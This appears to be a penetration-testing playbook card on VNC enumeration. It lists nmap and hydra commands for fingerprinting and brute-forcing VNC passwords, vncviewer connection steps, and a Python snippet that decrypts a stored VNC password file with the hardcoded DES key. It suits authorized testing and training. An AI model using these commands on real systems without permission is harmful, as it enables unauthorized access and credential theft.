---
id: vnc-enum
title: VNC Enumeration
stage: enumeration
tags: [windows, linux]
tools:
  - nmap -p5900-5910 --script vnc-info,vnc-brute $TARGET
  - hydra -P /usr/share/wordlists/rockyou.txt vnc://$TARGET
  - vncviewer $TARGET:5900
leads_to: [rev-shell, rdp-access]
summary: Check VNC for unauthenticated access, null authentication, or weak single-password credentials.
---

## Detect & Fingerprint

```bash
nmap -p5900-5910 --script vnc-info $TARGET
# Shows: protocol version, security types supported
# Security type 1 (None) = no authentication needed
```

## Null Authentication Check

If `Security types: None (1)` — connect directly without a password:

```bash
vncviewer $TARGET:5900
```

## Brute Force

VNC uses a **single shared password** (no username):

```bash
hydra -P /usr/share/wordlists/rockyou.txt vnc://$TARGET
nmap -p5900 --script vnc-brute $TARGET
```

## Connect

```bash
vncviewer $TARGET:5900              # prompts for password
vncviewer $TARGET:5901              # second display
vncviewer -passwd /tmp/passwd_file $TARGET:5900
```

## Crack Stored VNC Password File

VNC passwords are stored as DES-encrypted 8-byte hashes. The key is hardcoded:

```bash
# If you find ~/.vnc/passwd:
python3 -c "
import hashlib, struct
data = open('/path/to/passwd','rb').read()[:8]
key = bytes([23,82,107,6,35,78,88,7])
from Crypto.Cipher import DES
d = DES.new(key, DES.MODE_ECB)
print(d.decrypt(data))
"
# or use vncpwd / msfconsole auxiliary/analyze/crack_vnc
```

## Notes

- Ports: 5900 (display :0), 5901 (display :1), 5902 (display :2), etc.
- Also check port 5800 (VNC over HTTP/Java applet)
- VNC password max is 8 chars — anything longer is silently truncated by some servers
- GUI access gives you clipboard, file transfer, and full desktop — upgrade to proper shell from there
